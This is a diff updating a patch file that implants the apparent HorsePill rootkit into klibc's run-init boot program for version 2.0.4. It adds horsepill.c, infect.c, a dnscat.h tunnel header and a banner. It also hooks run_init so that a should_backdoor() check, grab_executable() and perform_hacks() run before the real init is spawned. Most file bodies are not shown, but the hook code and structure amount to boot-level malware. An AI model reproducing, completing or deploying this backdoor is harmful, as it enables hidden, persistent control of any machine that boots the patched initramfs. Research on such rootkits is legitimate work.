@@ -1,7 +1,7 @@
-Index: klibc-2.0.3/usr/kinit/run-init/Kbuild
+Index: klibc-2.0.4/usr/kinit/run-init/Kbuild
 ===================================================================
---- klibc-2.0.3.orig/usr/kinit/run-init/Kbuild
-+++ klibc-2.0.3/usr/kinit/run-init/Kbuild
+--- klibc-2.0.4.orig/usr/kinit/run-init/Kbuild
++++ klibc-2.0.4/usr/kinit/run-init/Kbuild
 @@ -6,7 +6,7 @@ static-y := static/run-init
  shared-y := shared/run-init
  
@@ -11,10 +11,10 @@ Index: klibc-2.0.3/usr/kinit/run-init/Kbuild
  
  # TODO - do we want a stripped version
  # TODO - do we want the static.g + shared.g directories?
-Index: klibc-2.0.3/usr/kinit/run-init/banner.h
+Index: klibc-2.0.4/usr/kinit/run-init/banner.h
 ===================================================================
 --- /dev/null
-+++ klibc-2.0.3/usr/kinit/run-init/banner.h
++++ klibc-2.0.4/usr/kinit/run-init/banner.h
 @@ -0,0 +1,1608 @@
 +#ifndef BANNER_H
 +#define BANNER_H
@@ -1624,10 +1624,10 @@ Index: klibc-2.0.3/usr/kinit/run-init/banner.h
 +unsigned int banner_txt_len = 19184;
 +
 +#endif
-Index: klibc-2.0.3/usr/kinit/run-init/dnscat.h
+Index: klibc-2.0.4/usr/kinit/run-init/dnscat.h
 ===================================================================
 --- /dev/null
-+++ klibc-2.0.3/usr/kinit/run-init/dnscat.h
++++ klibc-2.0.4/usr/kinit/run-init/dnscat.h
 @@ -0,0 +1,10654 @@
 +#ifndef DNSCAT_H
 +#define DNSCAT_H
@@ -12283,10 +12283,10 @@ Index: klibc-2.0.3/usr/kinit/run-init/dnscat.h
 +
 +
 +#endif
-Index: klibc-2.0.3/usr/kinit/run-init/horsepill.c
+Index: klibc-2.0.4/usr/kinit/run-init/horsepill.c
 ===================================================================
 --- /dev/null
-+++ klibc-2.0.3/usr/kinit/run-init/horsepill.c
++++ klibc-2.0.4/usr/kinit/run-init/horsepill.c
 @@ -0,0 +1,598 @@
 +#include "horsepill.h"
 +
@@ -12886,10 +12886,10 @@ Index: klibc-2.0.3/usr/kinit/run-init/horsepill.c
 + * vi: set shiftwidth=8 tabstop=8 noexpandtab:
 + * :indentSize=8:tabSize=8:noTabs=false:
 + */
-Index: klibc-2.0.3/usr/kinit/run-init/horsepill.h
+Index: klibc-2.0.4/usr/kinit/run-init/horsepill.h
 ===================================================================
 --- /dev/null
-+++ klibc-2.0.3/usr/kinit/run-init/horsepill.h
++++ klibc-2.0.4/usr/kinit/run-init/horsepill.h
 @@ -0,0 +1,23 @@
 +#ifndef HORSEPILL_H
 +#define HORSEPILL_H
@@ -12914,10 +12914,10 @@ Index: klibc-2.0.3/usr/kinit/run-init/horsepill.h
 + * vi: set shiftwidth=8 tabstop=8 noexpandtab:
 + * :indentSize=8:tabSize=8:noTabs=false:
 + */
-Index: klibc-2.0.3/usr/kinit/run-init/infect.c
+Index: klibc-2.0.4/usr/kinit/run-init/infect.c
 ===================================================================
 --- /dev/null
-+++ klibc-2.0.3/usr/kinit/run-init/infect.c
++++ klibc-2.0.4/usr/kinit/run-init/infect.c
 @@ -0,0 +1,339 @@
 +#include "infect.h"
 +
@@ -13258,10 +13258,10 @@ Index: klibc-2.0.3/usr/kinit/run-init/infect.c
 + * vi: set shiftwidth=8 tabstop=8 noexpandtab:
 + * :indentSize=8:tabSize=8:noTabs=false:
 + */
-Index: klibc-2.0.3/usr/kinit/run-init/infect.h
+Index: klibc-2.0.4/usr/kinit/run-init/infect.h
 ===================================================================
 --- /dev/null
-+++ klibc-2.0.3/usr/kinit/run-init/infect.h
++++ klibc-2.0.4/usr/kinit/run-init/infect.h
 @@ -0,0 +1,32 @@
 +#ifndef INFECT_H
 +#define INFECT_H
@@ -13295,10 +13295,10 @@ Index: klibc-2.0.3/usr/kinit/run-init/infect.h
 + * vi: set shiftwidth=8 tabstop=8 noexpandtab:
 + * :indentSize=8:tabSize=8:noTabs=false:
 + */
-Index: klibc-2.0.3/usr/kinit/run-init/runinitlib.c
+Index: klibc-2.0.4/usr/kinit/run-init/runinitlib.c
 ===================================================================
---- klibc-2.0.3.orig/usr/kinit/run-init/runinitlib.c
-+++ klibc-2.0.3/usr/kinit/run-init/runinitlib.c
+--- klibc-2.0.4.orig/usr/kinit/run-init/runinitlib.c
++++ klibc-2.0.4/usr/kinit/run-init/runinitlib.c
 @@ -69,6 +69,10 @@
  # define MS_MOVE	8192
  #endif
@@ -13310,11 +13310,11 @@ Index: klibc-2.0.3/usr/kinit/run-init/runinitlib.c
  static int nuke(const char *what);
  
  static int nuke_dirent(int len, const char *dir, const char *name, dev_t me)
-@@ -185,6 +189,16 @@
+@@ -185,6 +189,15 @@ const char *run_init(const char *realroo
  		return "rootfs not a ramfs or tmpfs";
  
  	/* Okay, I think we should be safe... */
-+	if (should_backdoor()) {
++	if (!dry_run && should_backdoor()) {
 +		if (grab_executable() < 0) {
 +			printf("could not grab executable!");
 +			exit(EXIT_FAILURE);
@@ -13323,16 +13323,15 @@ Index: klibc-2.0.3/usr/kinit/run-init/runinitlib.c
 +		puts((const char*)banner_txt);
 +		sleep(10);
 +	}
-+
  
- 	/* Delete rootfs contents */
- 	if (nuke_dir("/"))
-@@ -210,6 +224,8 @@
- 	dup2(confd, 2);
+ 	if (!dry_run) {
+ 		/* Delete rootfs contents */
+@@ -215,6 +228,8 @@ const char *run_init(const char *realroo
  	close(confd);
  
-+	perform_hacks();
+ 	if (!dry_run) {
++		perform_hacks();
 +
- 	/* Spawn init */
- 	execv(init, initargs);
- 	return init;		/* Failed to spawn init */
+ 		/* Spawn init */
+ 		execv(init, initargs);
+ 		return init;		/* Failed to spawn init */
